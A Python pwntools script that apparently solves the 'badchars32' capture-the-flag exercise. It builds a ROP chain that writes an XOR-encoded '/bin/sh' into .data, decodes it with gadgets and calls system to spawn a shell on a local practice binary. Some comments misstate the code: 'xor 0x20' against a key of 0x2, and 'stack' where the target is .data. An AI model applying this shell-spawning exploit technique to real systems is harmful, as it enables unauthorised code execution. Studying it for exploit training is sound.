from pwn import *

'''
rabin2 -S badchars32
25 0x00001038     8 0x0804a038     8 -rw- .data

0x080484e0    1 6            sym.imp.system
080484e0 <system@plt>:
 80484e0:	ff 25 24 a0 04 08    	jmp    *0x804a024
 80484e6:	68 30 00 00 00       	push   $0x30
 80484eb:	e9 80 ff ff ff       	jmp    8048470 <.plt>

0x08048899: pop esi; pop edi; ret; 
0x08048893: mov dword ptr [edi], esi; ret;

0x08048896: pop ebx; pop ecx; ret; 
0x08048890: xor byte ptr [ebx], cl; ret; 
'''

def main():
	data_segment = 0x0804a038
	system_plt = 0x080484e0
	pop_esi_edi = 0x08048899
	mov_edi_esi = 0x08048893
	pop_ebx_ecx = 0x08048896
	xor_ebx_cl = 0x08048890

	bin_sh = "/bin/sh\x00"
	bin_sh_enc = ''
	xor_byte = 0x2

	#encode /bin//sh
	for i in bin_sh:
		bin_sh_enc += chr(xor_byte ^ ord(i))

	payload = 'A' * 44
	#mov /bin/sh to stack
	payload += p32(pop_esi_edi)
	payload += bin_sh_enc[:4]
	payload += p32(data_segment)
	payload += p32(mov_edi_esi)

	payload += p32(pop_esi_edi)
	payload += bin_sh_enc[4:8]
	payload += p32(data_segment+4)
	payload += p32(mov_edi_esi)

	#decode xor 0x20 
	for i in range(len(bin_sh_enc)):
		payload += p32(pop_ebx_ecx)
		payload += p32(data_segment + i)
		payload += p32(xor_byte)
		payload += p32(xor_ebx_cl)

	payload += p32(system_plt)
	payload += p32(0xdeadbeef)
	payload += p32(data_segment)

	p = process('./badchars32')
	print p.recvrepeat(0.2)
	p.sendline(payload)
	p.interactive()

if __name__ == '__main__':
	main()
